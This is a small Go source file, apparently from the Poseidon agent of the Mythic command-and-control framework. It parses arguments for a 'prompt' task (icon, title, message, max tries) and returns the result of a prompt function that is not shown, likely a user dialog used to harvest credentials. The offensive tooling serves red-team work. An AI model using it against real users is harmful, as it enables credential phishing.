package prompt

import (
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Icon        string `json:"icon"`
	TitleText   string `json:"title"`
	MessageText string `json:"message"`
	MaxTries    int    `json:"max_tries"`
}

// Run - package function to run tcc_check
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	output := prompt(args)
	msg.UserOutput = output
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
